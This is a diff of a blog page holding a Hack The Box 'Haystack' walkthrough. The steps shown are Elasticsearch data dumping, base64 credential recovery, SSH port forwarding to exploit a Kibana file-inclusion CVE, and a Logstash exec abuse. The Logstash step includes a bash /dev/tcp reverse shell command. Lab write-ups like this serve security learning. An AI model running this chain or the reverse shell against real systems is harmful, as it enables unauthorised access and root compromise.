@@ -14,44 +14,77 @@
 
 
 
-  
-  <meta name="author" content="Neal" />
-  <meta name="description" content="
-Introduction Target: 10.10.10.115(Linux)
-Kali: 10.10.16.61
-HayStack is an easy box in hack the box. But it does isn&rsquo;t easy at all. It&rsquo;s annoying to find the user and password in the messy Spanish. For the root, you should have a basic understanding of ELK. Hence, the box is quite fresh in htb.
-Information Enumeration As usual, nmap is utilized to detect detailed ports and services.
-# Nmap 7.70 scan initiated Sun Jun 30 01:10:53 2019 as: nmap -sT -p- --min-rate 1500 -oN ports 10.10.10.115 Nmap scan report for 10.10.10.115 Host is up (0.27s latency). Not shown: 65532 filtered ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 9200/tcp open wap-wsp Then detect the detailed services:
-" />
+
 
   
+    
   
 
-  
-  <meta property="og:type" content="article" />
-  <meta property="og:title" content="Haystack - hack the box" />
-  <meta property="og:description" content="
-Introduction Target: 10.10.10.115(Linux)
-Kali: 10.10.16.61
-HayStack is an easy box in hack the box. But it does isn&rsquo;t easy at all. It&rsquo;s annoying to find the user and password in the messy Spanish. For the root, you should have a basic understanding of ELK. Hence, the box is quite fresh in htb.
-Information Enumeration As usual, nmap is utilized to detect detailed ports and services.
-# Nmap 7.70 scan initiated Sun Jun 30 01:10:53 2019 as: nmap -sT -p- --min-rate 1500 -oN ports 10.10.10.115 Nmap scan report for 10.10.10.115 Host is up (0.27s latency). Not shown: 65532 filtered ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 9200/tcp open wap-wsp Then detect the detailed services:
-" />
-  <meta property="og:url" content="https://madneal.com/post/haystack/" />
-  <meta property="og:image" content="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/img/avatar.jpg" />
 
 
 
+<meta name="author" content="Neal" />
+<meta name="description" content=" Introduction Target: 10.10.10.115(Linux) Kali: 10.10.16.61 HayStack is an easy box in hack the box. But it does isn&#39;t easy at all. It&#39;s annoying to find the …" />
+<meta name="generator" content="Hugo 0.145.0" />
+
+
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Haystack - hack the box" />
+<meta property="og:description" content=" Introduction Target: 10.10.10.115(Linux) Kali: 10.10.16.61 HayStack is an easy box in hack the box. But it does isn&#39;t easy at all. It&#39;s annoying to find the …" />
+<meta property="og:url" content="https://madneal.com/post/haystack/" />
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/img/avatar.jpg" />
+<meta property="og:site_name" content="Neal&#39;s Blog" />
+
+<meta property="article:published_time" content="2019-11-30T00:00:00Z" />
+<meta property="article:modified_time" content="2019-11-30T00:00:00Z" />
+<meta property="article:tag" content="安全" />
+<meta property="article:tag" content="渗透测试" />
+<meta property="article:tag" content="HTB" />
+
+
+
+
+<meta name="twitter:card" content="summary" />
+<meta name="twitter:site" content="@gohugoio" />
+<meta name="twitter:title" content="Haystack - hack the box" />
+<meta name="twitter:description" content=" Introduction Target: 10.10.10.115(Linux) Kali: 10.10.16.61 HayStack is an easy box in hack the box. But it does isn&#39;t easy at all. It&#39;s annoying to find the …" />
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/img/avatar.jpg" />
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "\"Haystack - hack the box\"",
+  "description": "\" Introduction Target: 10.10.10.115(Linux) Kali: 10.10.16.61 HayStack is an easy box in hack the box. But it does isn\\u0026#39;t easy at all. It\\u0026#39;s annoying to find the …\"",
+  "url": "\"https://madneal.com/post/haystack/\"",
+  "datePublished": "\"2019-11-30T00:00:00Z\"",
+  "dateModified": "\"2019-11-30T00:00:00Z\"",
+  "author": {
+    "@type": "Person",
+    "name": "\"Neal\""
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "\"Neal's Blog\"",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "\"https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/img/avatar.jpg\""
+    }
+  },
+  "image": "\"https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/img/avatar.jpg\""
+}
+</script>
 
 
 
 <link rel="canonical" href="https://madneal.com/post/haystack/" />
-<link rel="alternative" href="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/index.xml" title="Neal&#39;s Blog" type="application/atom+xml" />
+<link rel="alternate" href="https://madneal.com/index.xml" title="Neal&#39;s Blog" type="application/rss+xml" />
 
 
 <meta name="renderer" content="webkit" />
 <meta name="viewport" content="width=device-width,initial-scale=1" />
-<meta name="format-detection" content="telephone=no,email=no,adress=no" />
+<meta name="format-detection" content="telephone=no,email=no,address=no" />
 <meta http-equiv="Cache-Control" content="no-transform" />
 
 
@@ -83,16 +116,17 @@ Information Enumeration As usual, nmap is utilized to detect detailed ports and 
 
 
 
-<link rel="stylesheet" href="//cdn.bootcss.com/video.js/6.2.8/alt/video-js-cdn.min.css" />
 
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/css/bundle.css" />
+<style>
+.wechat-qr{width:15rem;height:15rem;margin:0 auto 1.5rem}@media screen and (max-width:800px){.wechat-qr{display:none}}.menu-toggle:focus{color:#5fbf5e}.post-detail .post-toc{margin:0 0 2rem;padding:1rem 1.25rem;border-left:3px solid #5fbf5e;background:#f4f3f1;font-size:.95rem}.post-detail .post-toc h2{margin:0 0 .5rem;font-size:1rem}.post-detail .post-toc ul,.post-detail .post-toc ol{margin:.25rem 0;padding-left:1.25rem}.post-detail .post-toc a{color:#4a4a4a}.post-detail .post-toc a:hover{color:#5fbf5e}.post-detail .post-footer .wechat-card{margin:2rem 0;padding:1rem;border-radius:5px;background:#f4f3f1;text-align:center}.post-detail .post-footer .wechat-card p{margin-top:0}.post-detail .post-footer .wechat-card img{width:12rem;height:12rem}.post-content h1 .heading-anchor,.post-content h2 .heading-anchor,.post-content h3 .heading-anchor,.post-content h4 .heading-anchor,.post-content h5 .heading-anchor,.post-content h6 .heading-anchor{margin-left:.25rem;border-bottom:none;color:#b5b5b5;font-size:.75em;opacity:0;transition:opacity .5s ease-out,color .5s ease-out}.post-content h1:hover .heading-anchor,.post-content h2:hover .heading-anchor,.post-content h3:hover .heading-anchor,.post-content h4:hover .heading-anchor,.post-content h5:hover .heading-anchor,.post-content h6:hover .heading-anchor,.post-content .heading-anchor:focus{opacity:1}.post-content .heading-anchor:hover,.post-content .heading-anchor:focus{color:#5fbf5e;border-bottom:none}.post-content pre{position:relative}.post-content pre .code-copy{position:absolute;top:.5rem;right:.5rem;padding:.2rem .45rem;border:1px solid #dbdbdb;border-radius:2px;background:#fafafa;color:#797979;font-size:.8rem;cursor:pointer;opacity:0;transition:opacity .5s ease-out,color .5s ease-out}.post-content pre:hover .code-copy,.post-content pre .code-copy:focus{opacity:1}.post-content pre .code-copy:hover,.post-content pre .code-copy:focus{color:#5fbf5e}.post-content table{display:block;overflow-x:auto}
+</style>
 
 
   
   <!--[if lt IE 9]>
     <script src="//cdn.bootcss.com/html5shiv/3.7.3/html5shiv.min.js"></script>
     <script src="//cdn.bootcss.com/respond.js/1.4.2/respond.min.js"></script>
-    <script src="//cdn.bootcss.com/video.js/6.2.8/ie8/videojs-ie8.min.js"></script>
   <![endif]-->
 
 <!--[if lte IE 11]>
@@ -120,15 +154,15 @@ Information Enumeration As usual, nmap is utilized to detect detailed ports and 
     
     
   <header class="site-header">
-  <img class="avatar" src="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/img/avatar.jpg" alt="Avatar">
+  <img class="avatar" src="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/img/avatar.jpg" alt="Avatar" width="128" height="128" decoding="async">
   
   <h2 class="title">Neal&#39;s Blog</h2>
   
   <p class="subtitle">Development &amp; Security</p>
-  <button class="menu-toggle" type="button">
+  <button class="menu-toggle" type="button" aria-controls="site-menu social-menu" aria-expanded="false" aria-label="Toggle navigation">
     <span class="icon icon-menu"></span>
   </button>
-  <nav class="site-menu collapsed">
+  <nav id="site-menu" class="site-menu collapsed">
     <h2 class="offscreen">Main Menu</h2>
     <ul class="menu-list">
       
@@ -160,8 +194,8 @@ Information Enumeration As usual, nmap is utilized to detect detailed ports and 
       
     </ul>
   </nav>
-  <img src="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/img/wechat.jpg" alt="wechat" style="width: 240px;height: 240px;">
-  <nav class="social-menu collapsed">
+  <img class="wechat-qr" src="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/img/wechat.jpg" alt="wechat" width="240" height="240" loading="lazy" decoding="async">
+  <nav id="social-menu" class="social-menu collapsed">
     <h2 class="offscreen">Social Networks</h2>
     <ul class="social-list">
 
@@ -226,14 +260,28 @@ Information Enumeration As usual, nmap is utilized to detect detailed ports and 
   <section class="main post-detail">
     <header class="post-header">
       <h1 class="post-title">Haystack - hack the box</h1>
-      <p class="post-meta">@Neal · Nov 30, 2019 · 7 min read</p>
+      <p class="post-meta">@Neal · <time datetime="2019-11-30">2019-11-30</time> · 约 7 分钟阅读</p>
     </header>
-    <article class="post-content"><p><img src="https://s2.ax1x.com/2019/08/04/eyER9x.png" alt="eyER9x.png"></p>
-<h2 id="introduction">Introduction</h2>
+    
+      <nav class="post-toc" aria-label="文章目录">
+        <h2>目录</h2>
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#information-enumeration">Information Enumeration</a></li>
+    <li><a href="#exploit">Exploit</a></li>
+    <li><a href="#privesc">PrivEsc</a></li>
+  </ul>
+</nav>
+      </nav>
+    
+    <article class="post-content"><p><img src="https://s2.ax1x.com/2019/08/04/eyER9x.png" alt="eyER9x.png" loading="lazy" decoding="async">
+</p>
+<h2 id="introduction">Introduction <a class="heading-anchor" href="#introduction" aria-label="链接到本节">#</a></h2>
 <p>Target: 10.10.10.115(Linux)</p>
 <p>Kali: 10.10.16.61</p>
 <p>HayStack is an easy box in hack the box. But it does isn&rsquo;t easy at all. It&rsquo;s annoying to find the user and password in the messy Spanish. For the root, you should have a basic understanding of ELK. Hence, the box is quite fresh in htb.</p>
-<h2 id="information-enumeration">Information Enumeration</h2>
+<h2 id="information-enumeration">Information Enumeration <a class="heading-anchor" href="#information-enumeration" aria-label="链接到本节">#</a></h2>
 <p>As usual, nmap is utilized to detect detailed ports and services.</p>
 <pre tabindex="0"><code># Nmap 7.70 scan initiated Sun Jun 30 01:10:53 2019 as: nmap -sT -p- --min-rate 1500 -oN ports 10.10.10.115
 Nmap scan report for 10.10.10.115
@@ -261,10 +309,12 @@ PORT     STATE SERVICE VERSION
 |_http-server-header: nginx/1.12.2
 |_http-title: 502 Bad Gateway
 </code></pre><p>For port 80, we find nothing except a picture of a needle. Exiftool is used to analyze. But nothing interesting found. Try to use gobuster to brute force the directory, but have not found any useful directories.</p>
-<p><img src="https://s2.ax1x.com/2019/08/03/eDD780.png" alt="eDD780.png"></p>
+<p><img src="https://s2.ax1x.com/2019/08/03/eDD780.png" alt="eDD780.png" loading="lazy" decoding="async">
+</p>
 <p>For port 9200, nmap seems to be failed to detect. But this port should be familiar to elasticserarch users. Elasticsearch is a popular search database in recent years. Something is interesting in elasticsearch. We will talk about this later.</p>
-<p><img src="https://s2.ax1x.com/2019/08/03/eDrFKO.png" alt="eDrFKO.png"></p>
-<h2 id="exploit">Exploit</h2>
+<p><img src="https://s2.ax1x.com/2019/08/03/eDrFKO.png" alt="eDrFKO.png" loading="lazy" decoding="async">
+</p>
+<h2 id="exploit">Exploit <a class="heading-anchor" href="#exploit" aria-label="链接到本节">#</a></h2>
 <p>In the above, we have talked about the ports. The elasticsearch should be the point. Try to obtain the data of elasticsearch. There is no authentication for elasticsearch in default. Hence, we can read the data from elasticsearh. In the beginning, I have tried to use kibana to analyze the data. Kibana is one component of ELK, which is a powerful tool to analyze the data of elasticsearch. And it&rsquo;s easy to use. Just download the <a href="https://www.elastic.co/cn/downloads/past-releases/kibana-6-4-2">files</a>, then decompress the files. There is only one step to finish before run kibana. Modify <code>elasticsearch.url</code> in <code>config.yml</code>, it should be configured to <code>10.10.10.115:9200</code>. Then you can run kibana directly.</p>
 <p>When you access to kibana, you will find two indexes: <code>bank</code> and <code>quotes</code>. The <code>bank</code> seems to be data of bank users information, which seems not to be useful. For index <code>quotes</code>, we have found nothing but the quote of Spanish. To be honest, Spanish is really messy for me to read. And I cannot find anything interesting. Kibana is useful for query specific field. But <code>quotes</code> seems to be an article. So I decide to dump all the data of <code>quotes</code>.</p>
 <p><a href="https://github.com/taskrabbit/elasticsearch-dump">elasticsearh-dump</a> is useful to dump the data from elasticsearch. Firstly, install the tool by <code>npm install elasticdump -g</code>. Then dump the data by:</p>
@@ -294,9 +344,10 @@ PORT     STATE SERVICE VERSION
 <pre tabindex="0"><code>I have to save the password for the machine: dXNlcjogc2VjdXJpdHkg
 </code></pre><pre tabindex="0"><code>This key cannot be lost, I keep it here: cGFzczogc3BhbmlzaC5pcy5rZXk=
 </code></pre><p>The end of the strings is encoded by base64. When decoded, we can find the username and password. Then you can ssh by the username and password.</p>
-<p><img src="https://s2.ax1x.com/2019/08/03/erZrTA.png" alt="erZrTA.png"></p>
+<p><img src="https://s2.ax1x.com/2019/08/03/erZrTA.png" alt="erZrTA.png" loading="lazy" decoding="async">
+</p>
 <p>To be honest, I don&rsquo;t like the user of the box. But it does works as the keyword: you have to find a needle in haystack.</p>
-<h2 id="privesc">PrivEsc</h2>
+<h2 id="privesc">PrivEsc <a class="heading-anchor" href="#privesc" aria-label="链接到本节">#</a></h2>
 <p>If you look around the box, you will find the box is installed with ELK. You can find kibana and logstash in the box. If you google <code>kibana exploit</code>. You will find <a href="https://github.com/mpgn/CVE-2018-17246">CVE-2018-17246</a> in Github. It has detailed illustrates the ways to exploit.</p>
 <p>However, there is a problem that the kibana service is only running in local. So you cannot access kibana service externally. There is a way to utilize ssh to redirect the network stream.</p>
 <pre tabindex="0"><code>ssh 5601:localhost:5601 security@10.10.10.115
@@ -327,7 +378,8 @@ kbn-version: 6.4.2
 origin: http://localhost:5601
 Connection: close
 </code></pre><p>Wait for a while, then we are kibana.</p>
-<p><a href="https://imgchr.com/i/erlWZT"><img src="https://s2.ax1x.com/2019/08/03/erlWZT.png" alt="erlWZT.png"></a></p>
+<p><a href="https://imgchr.com/i/erlWZT"><img src="https://s2.ax1x.com/2019/08/03/erlWZT.png" alt="erlWZT.png" loading="lazy" decoding="async">
+</a></p>
 <p>But we are still not root! Don&rsquo;t be upset. Let&rsquo;s move on. If we look at the logstash in the machine carefully, we will find something interesting. We find the user group <code>kibana</code> has write permission of <code>conf.d</code> of logstash.</p>
 <pre tabindex="0"><code>ls -lah
 total 52K
@@ -343,7 +395,8 @@ drwxrwxr-x.  2 root   kibana   62 jun 24 08:12 conf.d
 -rw-------.  1 kibana kibana 1,7K dic 10  2018 startup.option
 </code></pre><p><code>conf.d</code> is the config directory of logstash consists of three files in general. Take a deep look into the directory, you&rsquo;ll find an interesting thing. There is a command executes in <code>output.conf</code>. If you have basic knowledge of logstash, you should know the function of the three files. <code>input.conf</code> is used to config the data source. <code>filter.conf</code> is used to process the data, which is usually combined with grok. <code>output.conf</code> is used to output the processed data. We can find there is an <code>exec</code> in the <code>output.conf</code>.</p>
 <p>So the exploit is very clear. Create a file in <code>/opt/kibana/</code> whose name begins with <code>logstah_</code>. And make sure the content in the file can be parsed by grok correctly. Then the command can be executed successfully. The most important part is how to create the content to be parsed to correct <code>comando</code>. So you should know how to use grok. Grok is utilized to recognize specific fields by the regular expression. [Grok Debugger] is a useful tool to test grok online.</p>
-<p><img src="https://s2.ax1x.com/2019/08/04/eyPIxg.png" alt="eyPIxg.png"></p>
+<p><img src="https://s2.ax1x.com/2019/08/04/eyPIxg.png" alt="eyPIxg.png" loading="lazy" decoding="async">
+</p>
 <p>The expression is quite simple. If you know the regular expression, it will not be hard to understand the expression here.</p>
 <p><strong>filter.conf</strong></p>
 <pre tabindex="0"><code>filter {
@@ -376,22 +429,27 @@ drwxrwxr-x.  2 root   kibana   62 jun 24 08:12 conf.d
 </code></pre><p>Now, we have known how to create the corresponding <code>comando</code>. The next step is to choose the command to execute. There is not nc in the machine. But there&rsquo;s python and perl in the machine. But the reverse shell command is a little long. So I choose to use <code>bash -i &gt;&amp; /dev/tcp/10.10.16.61/1234 0&gt;&amp;1</code>. Write the content to the corresponding file:</p>
 <pre tabindex="0"><code>echo &#34;Ejecutar  comando: bash -i &gt;&amp; /dev/tcp/10.10.16.61/1234 0&gt;&amp;1&#34; &gt; /opt/kibana/logstash_1.txt
 </code></pre><p>Use the nc to listen at port 1234, wait a while, root is coming.</p>
-<p><img src="https://s2.ax1x.com/2019/08/04/eykUVs.png" alt="eykUVs.png"></p>
+<p><img src="https://s2.ax1x.com/2019/08/04/eykUVs.png" alt="eykUVs.png" loading="lazy" decoding="async">
+</p>
 </article>
     <footer class="post-footer">
+      <div class="wechat-card">
         <p>欢迎搜索微信号 mad_coder 或者扫描二维码关注公众号：</p>
-        <img src="https://user-images.githubusercontent.com/12164075/133170982-62816554-7dd8-4e97-adbc-734f1df61e73.jpg" alt="mad_coder">
+        <img src="https://user-images.githubusercontent.com/12164075/133170982-62816554-7dd8-4e97-adbc-734f1df61e73.jpg" alt="mad_coder" loading="lazy" decoding="async">
+      </div>
       
       <ul class="post-tags">
         
-          <li><a href="https://madneal.com/tags/htb"><span class="tag">HTB</span></a></li>
+          <li><a href="https://madneal.com/tags/%E5%AE%89%E5%85%A8/"><span class="tag">安全</span></a></li>
         
-          <li><a href="https://madneal.com/tags/%E9%9D%B6%E6%9C%BA"><span class="tag">靶机</span></a></li>
+          <li><a href="https://madneal.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><span class="tag">渗透测试</span></a></li>
+        
+          <li><a href="https://madneal.com/tags/htb/"><span class="tag">HTB</span></a></li>
         
       </ul>
       
       <p class="post-copyright">
-        © This post is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License，please give source if you wish to quote or reproduce.This post was published <strong>2393</strong> days ago, content in the post may be inaccurate, even wrong now, please take risk yourself.
+        © This post is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License，please give source if you wish to quote or reproduce.This post was published <strong>2394</strong> days ago, content in the post may be inaccurate, even wrong now, please take risk yourself.
       </p>
     </footer>
     
@@ -406,29 +464,8 @@ drwxrwxr-x.  2 root   kibana   62 jun 24 08:12 conf.d
 
 
 
-<script async src="//cdn.bootcss.com/video.js/6.2.8/alt/video.novtt.min.js"></script>
-<script async src="//cdn.bootcss.com/mathjax/2.7.2/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
-<script type="text/x-mathjax-config">
-  MathJax.Hub.Config({
-    tex2jax: {
-      inlineMath: [['$','$'], ['\\(','\\)']],
-      displayMath: [['$$','$$'], ['\\[','\\]']],
-      processEscapes: true,
-      processEnvironments: true,
-      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
-      TeX: { equationNumbers: { autoNumber: "AMS" },
-      extensions: ["AMSmath.js", "AMSsymbols.js"] }
-    }
-  });
-</script>
-<script type="text/x-mathjax-config">
-  // Fix <code> tags after MathJax finishes running. This is a
-  // hack to overcome a shortcoming of Markdown. Discussion at
-  // https://github.com/mojombo/jekyll/issues/199
-  MathJax.Hub.Queue(() => {
-    MathJax.Hub.getAllJax().map(v => v.SourceElement().parentNode.className += ' has-jax');
-  });
-</script>
+
+
 
 <script src="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/js/bundle.js"></script>
   
